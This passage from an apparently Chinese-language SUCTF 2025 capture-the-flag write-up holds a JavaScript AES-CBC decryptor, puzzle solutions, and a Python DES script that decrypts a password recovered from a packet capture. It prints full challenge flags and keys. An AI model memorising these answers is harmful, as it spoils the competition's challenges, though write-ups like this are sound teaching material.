// Transformations for decryption key expansion
var U1 = [0x00000000, 0x0e090d0b, 0x1c121a16, 0x121b171d, 0x3824342c, 0x362d3927, 0x24362e3a, 0x2a3f2331, 0x70486858, 0x7e416553, 0x6c5a724e, 0x62537f45, 0x486c5c74, 0x4665517f, 0x547e4662, 0x5a774b69, 0xe090d0b0, 0xee99ddbb, 0xfc82caa6, 0xf28bc7ad, 0xd8b4e49c, 0xd6bde997, 0xc4a6fe8a, 0xcaaff381, 0x90d8b8e8, 0x9ed1b5e3, 0x8ccaa2fe, 0x82c3aff5, 0xa8fc8cc4, 0xa6f581cf, 0xb4ee96d2, 0xbae79bd9, 0xdb3bbb7b, 0xd532b670, 0xc729a16d, 0xc920ac66, 0xe31f8f57, 0xed16825c, 0xff0d9541, 0xf104984a, 0xab73d323, 0xa57ade28, 0xb761c935, 0xb968c43e, 0x9357e70f, 0x9d5eea04, 0x8f45fd19, 0x814cf012, 0x3bab6bcb, 0x35a266c0, 0x27b971dd, 0x29b07cd6, 0x038f5fe7, 0x0d8652ec, 0x1f9d45f1, 0x119448fa, 0x4be30393, 0x45ea0e98, 0x57f11985, 0x59f8148e, 0x73c737bf, 0x7dce3ab4, 0x6fd52da9, 0x61dc20a2, 0xad766df6, 0xa37f60fd, 0xb16477e0, 0xbf6d7aeb, 0x955259da, 0x9b5b54d1, 0x894043cc, 0x87494ec7, 0xdd3e05ae, 0xd33708a5, 0xc12c1fb8, 0xcf2512b3, 0xe51a3182, 0xeb133c89, 0xf9082b94, 0xf701269f, 0x4de6bd46, 0x43efb04d, 0x51f4a750, 0x5ffdaa5b, 0x75c2896a, 0x7bcb8461, 0x69d0937c, 0x67d99e77, 0x3daed51e, 0x33a7d815, 0x21bccf08, 0x2fb5c203, 0x058ae132, 0x0b83ec39, 0x1998fb24, 0x1791f62f, 0x764dd68d, 0x7844db86, 0x6a5fcc9b, 0x6456c190, 0x4e69e2a1, 0x4060efaa, 0x527bf8b7, 0x5c72f5bc, 0x0605bed5, 0x080cb3de, 0x1a17a4c3, 0x141ea9c8, 0x3e218af9, 0x302887f2, 0x223390ef, 0x2c3a9de4, 0x96dd063d, 0x98d40b36, 0x8acf1c2b, 0x84c61120, 0xaef93211, 0xa0f03f1a, 0xb2eb2807, 0xbce2250c, 0xe6956e65, 0xe89c636e, 0xfa877473, 0xf48e7978, 0xdeb15a49, 0xd0b85742, 0xc2a3405f, 0xccaa4d54, 0x41ecdaf7, 0x4fe5d7fc, 0x5dfec0e1, 0x53f7cdea, 0x79c8eedb, 0x77c1e3d0, 0x65daf4cd, 0x6bd3f9c6, 0x31a4b2af, 0x3fadbfa4, 0x2db6a8b9, 0x23bfa5b2, 0x09808683, 0x07898b88, 0x15929c95, 0x1b9b919e, 0xa17c0a47, 0xaf75074c, 0xbd6e1051, 0xb3671d5a, 0x99583e6b, 0x97513360, 0x854a247d, 0x8b432976, 0xd134621f, 0xdf3d6f14, 0xcd267809, 0xc32f7502, 0xe9105633, 0xe7195b38, 0xf5024c25, 0xfb0b412e, 0x9ad7618c, 0x94de6c87, 0x86c57b9a, 0x88cc7691, 0xa2f355a0, 0xacfa58ab, 0xbee14fb6, 0xb0e842bd, 0xea9f09d4, 0xe49604df, 0xf68d13c2, 0xf8841ec9, 0xd2bb3df8, 0xdcb230f3, 0xcea927ee, 0xc0a02ae5, 0x7a47b13c, 0x744ebc37, 0x6655ab2a, 0x685ca621, 0x42638510, 0x4c6a881b, 0x5e719f06, 0x5078920d, 0x0a0fd964, 0x0406d46f, 0x161dc372, 0x1814ce79, 0x322bed48, 0x3c22e043, 0x2e39f75e, 0x2030fa55, 0xec9ab701, 0xe293ba0a, 0xf088ad17, 0xfe81a01c, 0xd4be832d, 0xdab78e26, 0xc8ac993b, 0xc6a59430, 0x9cd2df59, 0x92dbd252, 0x80c0c54f, 0x8ec9c844, 0xa4f6eb75, 0xaaffe67e, 0xb8e4f163, 0xb6edfc68, 0x0c0a67b1, 0x02036aba, 0x10187da7, 0x1e1170ac, 0x342e539d, 0x3a275e96, 0x283c498b, 0x26354480, 0x7c420fe9, 0x724b02e2, 0x605015ff, 0x6e5918f4, 0x44663bc5, 0x4a6f36ce, 0x587421d3, 0x567d2cd8, 0x37a10c7a, 0x39a80171, 0x2bb3166c, 0x25ba1b67, 0x0f853856, 0x018c355d, 0x13972240, 0x1d9e2f4b, 0x47e96422, 0x49e06929, 0x5bfb7e34, 0x55f2733f, 0x7fcd500e, 0x71c45d05, 0x63df4a18, 0x6dd64713, 0xd731dcca, 0xd938d1c1, 0xcb23c6dc, 0xc52acbd7, 0xef15e8e6, 0xe11ce5ed, 0xf307f2f0, 0xfd0efffb, 0xa779b492, 0xa970b999, 0xbb6bae84, 0xb562a38f, 0x9f5d80be, 0x91548db5, 0x834f9aa8, 0x8d4697a3];
var U2 = [0x00000000, 0x0b0e090d, 0x161c121a, 0x1d121b17, 0x2c382434, 0x27362d39, 0x3a24362e, 0x312a3f23, 0x58704868, 0x537e4165, 0x4e6c5a72, 0x4562537f, 0x74486c5c, 0x7f466551, 0x62547e46, 0x695a774b, 0xb0e090d0, 0xbbee99dd, 0xa6fc82ca, 0xadf28bc7, 0x9cd8b4e4, 0x97d6bde9, 0x8ac4a6fe, 0x81caaff3, 0xe890d8b8, 0xe39ed1b5, 0xfe8ccaa2, 0xf582c3af, 0xc4a8fc8c, 0xcfa6f581, 0xd2b4ee96, 0xd9bae79b, 0x7bdb3bbb, 0x70d532b6, 0x6dc729a1, 0x66c920ac, 0x57e31f8f, 0x5ced1682, 0x41ff0d95, 0x4af10498, 0x23ab73d3, 0x28a57ade, 0x35b761c9, 0x3eb968c4, 0x0f9357e7, 0x049d5eea, 0x198f45fd, 0x12814cf0, 0xcb3bab6b, 0xc035a266, 0xdd27b971, 0xd629b07c, 0xe7038f5f, 0xec0d8652, 0xf11f9d45, 0xfa119448, 0x934be303, 0x9845ea0e, 0x8557f119, 0x8e59f814, 0xbf73c737, 0xb47dce3a, 0xa96fd52d, 0xa261dc20, 0xf6ad766d, 0xfda37f60, 0xe0b16477, 0xebbf6d7a, 0xda955259, 0xd19b5b54, 0xcc894043, 0xc787494e, 0xaedd3e05, 0xa5d33708, 0xb8c12c1f, 0xb3cf2512, 0x82e51a31, 0x89eb133c, 0x94f9082b, 0x9ff70126, 0x464de6bd, 0x4d43efb0, 0x5051f4a7, 0x5b5ffdaa, 0x6a75c289, 0x617bcb84, 0x7c69d093, 0x7767d99e, 0x1e3daed5, 0x1533a7d8, 0x0821bccf, 0x032fb5c2, 0x32058ae1, 0x390b83ec, 0x241998fb, 0x2f1791f6, 0x8d764dd6, 0x867844db, 0x9b6a5fcc, 0x906456c1, 0xa14e69e2, 0xaa4060ef, 0xb7527bf8, 0xbc5c72f5, 0xd50605be, 0xde080cb3, 0xc31a17a4, 0xc8141ea9, 0xf93e218a, 0xf2302887, 0xef223390, 0xe42c3a9d, 0x3d96dd06, 0x3698d40b, 0x2b8acf1c, 0x2084c611, 0x11aef932, 0x1aa0f03f, 0x07b2eb28, 0x0cbce225, 0x65e6956e, 0x6ee89c63, 0x73fa8774, 0x78f48e79, 0x49deb15a, 0x42d0b857, 0x5fc2a340, 0x54ccaa4d, 0xf741ecda, 0xfc4fe5d7, 0xe15dfec0, 0xea53f7cd, 0xdb79c8ee, 0xd077c1e3, 0xcd65daf4, 0xc66bd3f9, 0xaf31a4b2, 0xa43fadbf, 0xb92db6a8, 0xb223bfa5, 0x83098086, 0x8807898b, 0x9515929c, 0x9e1b9b91, 0x47a17c0a, 0x4caf7507, 0x51bd6e10, 0x5ab3671d, 0x6b99583e, 0x60975133, 0x7d854a24, 0x768b4329, 0x1fd13462, 0x14df3d6f, 0x09cd2678, 0x02c32f75, 0x33e91056, 0x38e7195b, 0x25f5024c, 0x2efb0b41, 0x8c9ad761, 0x8794de6c, 0x9a86c57b, 0x9188cc76, 0xa0a2f355, 0xabacfa58, 0xb6bee14f, 0xbdb0e842, 0xd4ea9f09, 0xdfe49604, 0xc2f68d13, 0xc9f8841e, 0xf8d2bb3d, 0xf3dcb230, 0xeecea927, 0xe5c0a02a, 0x3c7a47b1, 0x37744ebc, 0x2a6655ab, 0x21685ca6, 0x10426385, 0x1b4c6a88, 0x065e719f, 0x0d507892, 0x640a0fd9, 0x6f0406d4, 0x72161dc3, 0x791814ce, 0x48322bed, 0x433c22e0, 0x5e2e39f7, 0x552030fa, 0x01ec9ab7, 0x0ae293ba, 0x17f088ad, 0x1cfe81a0, 0x2dd4be83, 0x26dab78e, 0x3bc8ac99, 0x30c6a594, 0x599cd2df, 0x5292dbd2, 0x4f80c0c5, 0x448ec9c8, 0x75a4f6eb, 0x7eaaffe6, 0x63b8e4f1, 0x68b6edfc, 0xb10c0a67, 0xba02036a, 0xa710187d, 0xac1e1170, 0x9d342e53, 0x963a275e, 0x8b283c49, 0x80263544, 0xe97c420f, 0xe2724b02, 0xff605015, 0xf46e5918, 0xc544663b, 0xce4a6f36, 0xd3587421, 0xd8567d2c, 0x7a37a10c, 0x7139a801, 0x6c2bb316, 0x6725ba1b, 0x560f8538, 0x5d018c35, 0x40139722, 0x4b1d9e2f, 0x2247e964, 0x2949e069, 0x345bfb7e, 0x3f55f273, 0x0e7fcd50, 0x0571c45d, 0x1863df4a, 0x136dd647, 0xcad731dc, 0xc1d938d1, 0xdccb23c6, 0xd7c52acb, 0xe6ef15e8, 0xede11ce5, 0xf0f307f2, 0xfbfd0eff, 0x92a779b4, 0x99a970b9, 0x84bb6bae, 0x8fb562a3, 0xbe9f5d80, 0xb591548d, 0xa8834f9a, 0xa38d4697];
var U3 = [0x00000000, 0x0d0b0e09, 0x1a161c12, 0x171d121b, 0x342c3824, 0x3927362d, 0x2e3a2436, 0x23312a3f, 0x68587048, 0x65537e41, 0x724e6c5a, 0x7f456253, 0x5c74486c, 0x517f4665, 0x4662547e, 0x4b695a77, 0xd0b0e090, 0xddbbee99, 0xcaa6fc82, 0xc7adf28b, 0xe49cd8b4, 0xe997d6bd, 0xfe8ac4a6, 0xf381caaf, 0xb8e890d8, 0xb5e39ed1, 0xa2fe8cca, 0xaff582c3, 0x8cc4a8fc, 0x81cfa6f5, 0x96d2b4ee, 0x9bd9bae7, 0xbb7bdb3b, 0xb670d532, 0xa16dc729, 0xac66c920, 0x8f57e31f, 0x825ced16, 0x9541ff0d, 0x984af104, 0xd323ab73, 0xde28a57a, 0xc935b761, 0xc43eb968, 0xe70f9357, 0xea049d5e, 0xfd198f45, 0xf012814c, 0x6bcb3bab, 0x66c035a2, 0x71dd27b9, 0x7cd629b0, 0x5fe7038f, 0x52ec0d86, 0x45f11f9d, 0x48fa1194, 0x03934be3, 0x0e9845ea, 0x198557f1, 0x148e59f8, 0x37bf73c7, 0x3ab47dce, 0x2da96fd5, 0x20a261dc, 0x6df6ad76, 0x60fda37f, 0x77e0b164, 0x7aebbf6d, 0x59da9552, 0x54d19b5b, 0x43cc8940, 0x4ec78749, 0x05aedd3e, 0x08a5d337, 0x1fb8c12c, 0x12b3cf25, 0x3182e51a, 0x3c89eb13, 0x2b94f908, 0x269ff701, 0xbd464de6, 0xb04d43ef, 0xa75051f4, 0xaa5b5ffd, 0x896a75c2, 0x84617bcb, 0x937c69d0, 0x9e7767d9, 0xd51e3dae, 0xd81533a7, 0xcf0821bc, 0xc2032fb5, 0xe132058a, 0xec390b83, 0xfb241998, 0xf62f1791, 0xd68d764d, 0xdb867844, 0xcc9b6a5f, 0xc1906456, 0xe2a14e69, 0xefaa4060, 0xf8b7527b, 0xf5bc5c72, 0xbed50605, 0xb3de080c, 0xa4c31a17, 0xa9c8141e, 0x8af93e21, 0x87f23028, 0x90ef2233, 0x9de42c3a, 0x063d96dd, 0x0b3698d4, 0x1c2b8acf, 0x112084c6, 0x3211aef9, 0x3f1aa0f0, 0x2807b2eb, 0x250cbce2, 0x6e65e695, 0x636ee89c, 0x7473fa87, 0x7978f48e, 0x5a49deb1, 0x5742d0b8, 0x405fc2a3, 0x4d54ccaa, 0xdaf741ec, 0xd7fc4fe5, 0xc0e15dfe, 0xcdea53f7, 0xeedb79c8, 0xe3d077c1, 0xf4cd65da, 0xf9c66bd3, 0xb2af31a4, 0xbfa43fad, 0xa8b92db6, 0xa5b223bf, 0x86830980, 0x8b880789, 0x9c951592, 0x919e1b9b, 0x0a47a17c, 0x074caf75, 0x1051bd6e, 0x1d5ab367, 0x3e6b9958, 0x33609751, 0x247d854a, 0x29768b43, 0x621fd134, 0x6f14df3d, 0x7809cd26, 0x7502c32f, 0x5633e910, 0x5b38e719, 0x4c25f502, 0x412efb0b, 0x618c9ad7, 0x6c8794de, 0x7b9a86c5, 0x769188cc, 0x55a0a2f3, 0x58abacfa, 0x4fb6bee1, 0x42bdb0e8, 0x09d4ea9f, 0x04dfe496, 0x13c2f68d, 0x1ec9f884, 0x3df8d2bb, 0x30f3dcb2, 0x27eecea9, 0x2ae5c0a0, 0xb13c7a47, 0xbc37744e, 0xab2a6655, 0xa621685c, 0x85104263, 0x881b4c6a, 0x9f065e71, 0x920d5078, 0xd9640a0f, 0xd46f0406, 0xc372161d, 0xce791814, 0xed48322b, 0xe0433c22, 0xf75e2e39, 0xfa552030, 0xb701ec9a, 0xba0ae293, 0xad17f088, 0xa01cfe81, 0x832dd4be, 0x8e26dab7, 0x993bc8ac, 0x9430c6a5, 0xdf599cd2, 0xd25292db, 0xc54f80c0, 0xc8448ec9, 0xeb75a4f6, 0xe67eaaff, 0xf163b8e4, 0xfc68b6ed, 0x67b10c0a, 0x6aba0203, 0x7da71018, 0x70ac1e11, 0x539d342e, 0x5e963a27, 0x498b283c, 0x44802635, 0x0fe97c42, 0x02e2724b, 0x15ff6050, 0x18f46e59, 0x3bc54466, 0x36ce4a6f, 0x21d35874, 0x2cd8567d, 0x0c7a37a1, 0x017139a8, 0x166c2bb3, 0x1b6725ba, 0x38560f85, 0x355d018c, 0x22401397, 0x2f4b1d9e, 0x642247e9, 0x692949e0, 0x7e345bfb, 0x733f55f2, 0x500e7fcd, 0x5d0571c4, 0x4a1863df, 0x47136dd6, 0xdccad731, 0xd1c1d938, 0xc6dccb23, 0xcbd7c52a, 0xe8e6ef15, 0xe5ede11c, 0xf2f0f307, 0xfffbfd0e, 0xb492a779, 0xb999a970, 0xae84bb6b, 0xa38fb562, 0x80be9f5d, 0x8db59154, 0x9aa8834f, 0x97a38d46];
var U4 = [0x00000000, 0x090d0b0e, 0x121a161c, 0x1b171d12, 0x24342c38, 0x2d392736, 0x362e3a24, 0x3f23312a, 0x48685870, 0x4165537e, 0x5a724e6c, 0x537f4562, 0x6c5c7448, 0x65517f46, 0x7e466254, 0x774b695a, 0x90d0b0e0, 0x99ddbbee, 0x82caa6fc, 0x8bc7adf2, 0xb4e49cd8, 0xbde997d6, 0xa6fe8ac4, 0xaff381ca, 0xd8b8e890, 0xd1b5e39e, 0xcaa2fe8c, 0xc3aff582, 0xfc8cc4a8, 0xf581cfa6, 0xee96d2b4, 0xe79bd9ba, 0x3bbb7bdb, 0x32b670d5, 0x29a16dc7, 0x20ac66c9, 0x1f8f57e3, 0x16825ced, 0x0d9541ff, 0x04984af1, 0x73d323ab, 0x7ade28a5, 0x61c935b7, 0x68c43eb9, 0x57e70f93, 0x5eea049d, 0x45fd198f, 0x4cf01281, 0xab6bcb3b, 0xa266c035, 0xb971dd27, 0xb07cd629, 0x8f5fe703, 0x8652ec0d, 0x9d45f11f, 0x9448fa11, 0xe303934b, 0xea0e9845, 0xf1198557, 0xf8148e59, 0xc737bf73, 0xce3ab47d, 0xd52da96f, 0xdc20a261, 0x766df6ad, 0x7f60fda3, 0x6477e0b1, 0x6d7aebbf, 0x5259da95, 0x5b54d19b, 0x4043cc89, 0x494ec787, 0x3e05aedd, 0x3708a5d3, 0x2c1fb8c1, 0x2512b3cf, 0x1a3182e5, 0x133c89eb, 0x082b94f9, 0x01269ff7, 0xe6bd464d, 0xefb04d43, 0xf4a75051, 0xfdaa5b5f, 0xc2896a75, 0xcb84617b, 0xd0937c69, 0xd99e7767, 0xaed51e3d, 0xa7d81533, 0xbccf0821, 0xb5c2032f, 0x8ae13205, 0x83ec390b, 0x98fb2419, 0x91f62f17, 0x4dd68d76, 0x44db8678, 0x5fcc9b6a, 0x56c19064, 0x69e2a14e, 0x60efaa40, 0x7bf8b752, 0x72f5bc5c, 0x05bed506, 0x0cb3de08, 0x17a4c31a, 0x1ea9c814, 0x218af93e, 0x2887f230, 0x3390ef22, 0x3a9de42c, 0xdd063d96, 0xd40b3698, 0xcf1c2b8a, 0xc6112084, 0xf93211ae, 0xf03f1aa0, 0xeb2807b2, 0xe2250cbc, 0x956e65e6, 0x9c636ee8, 0x877473fa, 0x8e7978f4, 0xb15a49de, 0xb85742d0, 0xa3405fc2, 0xaa4d54cc, 0xecdaf741, 0xe5d7fc4f, 0xfec0e15d, 0xf7cdea53, 0xc8eedb79, 0xc1e3d077, 0xdaf4cd65, 0xd3f9c66b, 0xa4b2af31, 0xadbfa43f, 0xb6a8b92d, 0xbfa5b223, 0x80868309, 0x898b8807, 0x929c9515, 0x9b919e1b, 0x7c0a47a1, 0x75074caf, 0x6e1051bd, 0x671d5ab3, 0x583e6b99, 0x51336097, 0x4a247d85, 0x4329768b, 0x34621fd1, 0x3d6f14df, 0x267809cd, 0x2f7502c3, 0x105633e9, 0x195b38e7, 0x024c25f5, 0x0b412efb, 0xd7618c9a, 0xde6c8794, 0xc57b9a86, 0xcc769188, 0xf355a0a2, 0xfa58abac, 0xe14fb6be, 0xe842bdb0, 0x9f09d4ea, 0x9604dfe4, 0x8d13c2f6, 0x841ec9f8, 0xbb3df8d2, 0xb230f3dc, 0xa927eece, 0xa02ae5c0, 0x47b13c7a, 0x4ebc3774, 0x55ab2a66, 0x5ca62168, 0x63851042, 0x6a881b4c, 0x719f065e, 0x78920d50, 0x0fd9640a, 0x06d46f04, 0x1dc37216, 0x14ce7918, 0x2bed4832, 0x22e0433c, 0x39f75e2e, 0x30fa5520, 0x9ab701ec, 0x93ba0ae2, 0x88ad17f0, 0x81a01cfe, 0xbe832dd4, 0xb78e26da, 0xac993bc8, 0xa59430c6, 0xd2df599c, 0xdbd25292, 0xc0c54f80, 0xc9c8448e, 0xf6eb75a4, 0xffe67eaa, 0xe4f163b8, 0xedfc68b6, 0x0a67b10c, 0x036aba02, 0x187da710, 0x1170ac1e, 0x2e539d34, 0x275e963a, 0x3c498b28, 0x35448026, 0x420fe97c, 0x4b02e272, 0x5015ff60, 0x5918f46e, 0x663bc544, 0x6f36ce4a, 0x7421d358, 0x7d2cd856, 0xa10c7a37, 0xa8017139, 0xb3166c2b, 0xba1b6725, 0x8538560f, 0x8c355d01, 0x97224013, 0x9e2f4b1d, 0xe9642247, 0xe0692949, 0xfb7e345b, 0xf2733f55, 0xcd500e7f, 0xc45d0571, 0xdf4a1863, 0xd647136d, 0x31dccad7, 0x38d1c1d9, 0x23c6dccb, 0x2acbd7c5, 0x15e8e6ef, 0x1ce5ede1, 0x07f2f0f3, 0x0efffbfd, 0x79b492a7, 0x70b999a9, 0x6bae84bb, 0x62a38fb5, 0x5d80be9f, 0x548db591, 0x4f9aa883, 0x4697a38d];

function convertToInt32(bytes) {
    var result = [];
    for (var i = 0; i < bytes.length; i += 4) {
        result.push(
            (bytes[i] << 24) |
            (bytes[i + 1] << 16) |
            (bytes[i + 2] << 8) |
            bytes[i + 3]
        );
    }
    return result;
}

var AES = function (key) {
    if (!(this instanceof AES)) {
        throw Error('AES must be instanitated with `new`');
    }

    Object.defineProperty(this, 'key', {
        value: coerceArray(key, true)
    });

    this._prepare();
}


AES.prototype._prepare = function () {

    var rounds = numberOfRounds[this.key.length];
    if (rounds == null) {
        throw new Error('invalid key size (must be 16, 24 or 32 bytes)');
    }

    // encryption round keys
    this._Ke = [];

    // decryption round keys
    this._Kd = [];

    for (var i = 0; i <= rounds; i++) {
        this._Ke.push([0, 0, 0, 0]);
        this._Kd.push([0, 0, 0, 0]);
    }

    var roundKeyCount = (rounds + 1) * 4;
    var KC = this.key.length / 4;

    // convert the key into ints
    var tk = convertToInt32(this.key);

    // copy values into round key arrays
    var index;
    for (var i = 0; i < KC; i++) {
        index = i >> 2;
        this._Ke[index][i % 4] = tk[i];
        this._Kd[rounds - index][i % 4] = tk[i];
    }

    // key expansion (fips-197 section 5.2)
    var rconpointer = 0;
    var t = KC, tt;
    while (t < roundKeyCount) {
        tt = tk[KC - 1];
        tk[0] ^= ((S[(tt >> 16) & 0xFF] << 24) ^
            (S[(tt >> 8) & 0xFF] << 16) ^
            (S[tt & 0xFF] << 8) ^
            S[(tt >> 24) & 0xFF] ^
            (rcon[rconpointer] << 24));
        rconpointer += 1;

        // key expansion (for non-256 bit)
        if (KC != 8) {
            for (var i = 1; i < KC; i++) {
                tk[i] ^= tk[i - 1];
            }

            // key expansion for 256-bit keys is "slightly different" (fips-197)
        } else {
            for (var i = 1; i < (KC / 2); i++) {
                tk[i] ^= tk[i - 1];
            }
            tt = tk[(KC / 2) - 1];

            tk[KC / 2] ^= (S[tt & 0xFF] ^
                (S[(tt >> 8) & 0xFF] << 8) ^
                (S[(tt >> 16) & 0xFF] << 16) ^
                (S[(tt >> 24) & 0xFF] << 24));

            for (var i = (KC / 2) + 1; i < KC; i++) {
                tk[i] ^= tk[i - 1];
            }
        }

        // copy values into round key arrays
        var i = 0, r, c;
        while (i < KC && t < roundKeyCount) {
            r = t >> 2;
            c = t % 4;
            this._Ke[r][c] = tk[i];
            this._Kd[rounds - r][c] = tk[i++];
            t++;
        }
    }

    // inverse-cipher-ify the decryption round key (fips-197 section 5.3)
    for (var r = 1; r < rounds; r++) {
        for (var c = 0; c < 4; c++) {
            tt = this._Kd[r][c];
            this._Kd[r][c] = (U1[(tt >> 24) & 0xFF] ^
                U2[(tt >> 16) & 0xFF] ^
                U3[(tt >> 8) & 0xFF] ^
                U4[tt & 0xFF]);
        }
    }
}

AES.prototype.encrypt = function (plaintext) {
    if (plaintext.length != 16) {
        throw new Error('invalid plaintext size (must be 16 bytes)');
    }

    var rounds = this._Ke.length - 1;
    var a = [0, 0, 0, 0];

    // convert plaintext to (ints ^ key)
    var t = convertToInt32(plaintext);
    for (var i = 0; i < 4; i++) {
        t[i] ^= this._Ke[0][i];
    }

    // apply round transforms
    for (var r = 1; r < rounds; r++) {
        for (var i = 0; i < 4; i++) {
            a[i] = (T1[(t[i] >> 24) & 0xff] ^
                T2[(t[(i + 1) % 4] >> 16) & 0xff] ^
                T3[(t[(i + 2) % 4] >> 8) & 0xff] ^
                T4[t[(i + 3) % 4] & 0xff] ^
                this._Ke[r][i]);
        }
        t = a.slice();
    }

    // the last round is special
    var result = createArray(16), tt;
    for (var i = 0; i < 4; i++) {
        tt = this._Ke[rounds][i];
        result[4 * i] = (S[(t[i] >> 24) & 0xff] ^ (tt >> 24)) & 0xff;
        result[4 * i + 1] = (S[(t[(i + 1) % 4] >> 16) & 0xff] ^ (tt >> 16)) & 0xff;
        result[4 * i + 2] = (S[(t[(i + 2) % 4] >> 8) & 0xff] ^ (tt >> 8)) & 0xff;
        result[4 * i + 3] = (S[t[(i + 3) % 4] & 0xff] ^ tt) & 0xff;
    }

    return result;
}

AES.prototype.decrypt = function (ciphertext) {
    if (ciphertext.length != 16) {
        throw new Error('invalid ciphertext size (must be 16 bytes)');
    }

    var rounds = this._Kd.length - 1;
    var a = [0, 0, 0, 0];

    // convert plaintext to (ints ^ key)
    var t = convertToInt32(ciphertext);
    for (var i = 0; i < 4; i++) {
        t[i] ^= this._Kd[0][i];
    }

    // apply round transforms
    for (var r = 1; r < rounds; r++) {
        for (var i = 0; i < 4; i++) {
            a[i] = (T5[(t[i] >> 24) & 0xff] ^
                T6[(t[(i + 3) % 4] >> 16) & 0xff] ^
                T7[(t[(i + 2) % 4] >> 8) & 0xff] ^
                T8[t[(i + 1) % 4] & 0xff] ^
                this._Kd[r][i]);
        }
        t = a.slice();
    }

    // the last round is special
    var result = createArray(16), tt;
    for (var i = 0; i < 4; i++) {
        tt = this._Kd[rounds][i];
        result[4 * i] = (Si[(t[i] >> 24) & 0xff] ^ (tt >> 24)) & 0xff;
        result[4 * i + 1] = (Si[(t[(i + 3) % 4] >> 16) & 0xff] ^ (tt >> 16)) & 0xff;
        result[4 * i + 2] = (Si[(t[(i + 2) % 4] >> 8) & 0xff] ^ (tt >> 8)) & 0xff;
        result[4 * i + 3] = (Si[t[(i + 1) % 4] & 0xff] ^ tt) & 0xff;
    }

    return result;
}

/**
 *  Mode Of Operation - Cipher Block Chaining (CBC)
 */
var AESCBC = function (key, iv) {
    if (!(this instanceof AESCBC)) {
        throw Error('AES must be instanitated with `new`');
    }

    this.description = "Cipher Block Chaining";
    this.name = "cbc";

    if (!iv) {
        iv = createArray(16);

    } else if (iv.length != 16) {
        throw new Error('invalid initialation vector size (must be 16 bytes)');
    }

    this._lastCipherblock = coerceArray(iv, true);

    this._aes = new AES(key);
}

AESCBC.prototype.encrypt = function (plaintext) {
    plaintext = coerceArray(plaintext);

    if ((plaintext.length % 16) !== 0) {
        throw new Error('invalid plaintext size (must be multiple of 16 bytes)');
    }

    var ciphertext = createArray(plaintext.length);
    var block = createArray(16);

    for (var i = 0; i < plaintext.length; i += 16) {
        copyArray(plaintext, block, 0, i, i + 16);

        for (var j = 0; j < 16; j++) {
            block[j] ^= this._lastCipherblock[j];
        }

        this._lastCipherblock = this._aes.encrypt(block);
        copyArray(this._lastCipherblock, ciphertext, i);
    }

    return ciphertext;
}

AESCBC.prototype.decrypt = function (ciphertext) {
    ciphertext = coerceArray(ciphertext);

    if ((ciphertext.length % 16) !== 0) {
        throw new Error('invalid ciphertext size (must be multiple of 16 bytes)');
    }

    var plaintext = createArray(ciphertext.length);
    var block = createArray(16);

    for (var i = 0; i < ciphertext.length; i += 16) {
        copyArray(ciphertext, block, 0, i, i + 16);
        block = this._aes.decrypt(block);

        for (var j = 0; j < 16; j++) {
            plaintext[i + j] = block[j] ^ this._lastCipherblock[j];
        }

        copyArray(ciphertext, this._lastCipherblock, 0, i, i + 16);
    }

    return plaintext;
}


function aes_cbc_decrypt(ciphertext, key, iv) {
    var aes = new AESCBC(new Uint8Array(Buffer.from(key)), new Uint8Array(Buffer.from(iv)));
    var plaintext = aes.decrypt(ciphertext);
    return plaintext;
}

var dec = aes_cbc_decrypt(new Uint8Array([0x38,0xe2,0x07,0xc3,0xd0,0xe0,0xd6,0x34,0x2f,0x4a,0xf6,0x54,0x20,0x5b,0x67,0x10,0xe4,0xe8,0x30,0x6c,0xe7,0xeb,0x03,0x21,0x16,0x92,0x7f,0xae,0x56,0xf7,0x22,0xa4,0x84,0xfe,0x6c,0xa6,0x6c,0x15,0x9e,0x42,0x12,0xab,0x65,0xef,0x99,0xd4,0xc1,0xb0]), "50aca6ed2feffa0c", "50aca6ed2feffa0c");
const decoder = new TextDecoder(); 
const text = decoder.decode(dec); 
console.log(text);

// _H4PpY_AsT_TTTTTTBing_BinG_Bing}
```

但是解密出来发现只有flag的后面一部分，前面哪去了呢??? 这就是为什么这题会放在misc了

不难发现题目代码中插入了许多类似BingBing的字符串，看似好像屁用没有，但把两个Bing中间那个字符哎你全都给他提出来按顺序拼接一下，wow，amazing! 得到了神奇的`SUCTF{Hi`​

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-00-25.png" alt="SUCTF_2025_Writeup-2025-01-14-16-00-25" position="center" style="border-radius: 1px;" >}}

那么最终flag就是`SUCTF{Hi_H4PpY_AsT_TTTTTTBing_BinG_Bing}`​

### SU\_RealCheckin

直接看文件给的表情符号的英文单词首个字母就是

suctf{welcome\_to\_suctf\_you\_can\_really\_dance}

### SU\_checkin

可以在wireshark里面直接字符串搜索flag，可以跟踪到下面这个

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-00-35.png" alt="SUCTF_2025_Writeup-2025-01-14-16-00-35" position="center" style="border-radius: 1px;" >}}

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-00-41.png" alt="SUCTF_2025_Writeup-2025-01-14-16-00-41" position="center" style="border-radius: 1px;" >}}

很明显的密码，但是这里因为是cmdline会保护命令行的密码不显示完全,而且看得到是`sepasswordlen23SUCT`​

那很明显是SUCTF然后差三位（我是直接猜的666没爆破）所以密码就是`sepasswordlen23SUCTF666`​

网上找了个解密的

```Python
import base64
import hashlib
import re
import os
from Crypto.Cipher import DES

def get_derived_key(password, salt, count):
    key = password + salt
    for i in range(count):
        m = hashlib.md5(key)
        key = m.digest()
    return (key[:8], key[8:])

def decrypt(msg, password):
    msg_bytes = base64.b64decode(msg)  # 先解码 Base64
    salt = msg_bytes[:8]  # 获取盐值
    enc_text = msg_bytes[8:]  # 获取加密文本
    (dk, iv) = get_derived_key(password, salt, 1000)  # 获取密钥和初始化向量
    crypter = DES.new(dk, DES.MODE_CBC, iv)  # 创建 DES 解密器
    text = crypter.decrypt(enc_text)  # 解密数据
    # 去除填充字节
    return re.sub(r'[\x01-\x08]', '', text.decode("utf-8"))

def main():
    # 已经加密的密文 (Base64 编码的)
    msg = b"ElV+bGCnJYHVR8m23GLhprTGY0gHi/tNXBkGBtQusB/zs0uIHHoXMJoYd6oSOoKuFWmAHYrxkbg="
    passwd = b"SePassWordLen23SUCTF666"  # 解密所需的密码
  
    # 调用解密函数
    decrypted_msg = decrypt(msg, passwd)
    print(f"Decrypted msg: {decrypted_msg}")

if __name__ == "__main__":
    main()


Decrypted msg: SUCTF{338dbe11-e9f6-4e46-b1e5-eca84fb6af3f}
```

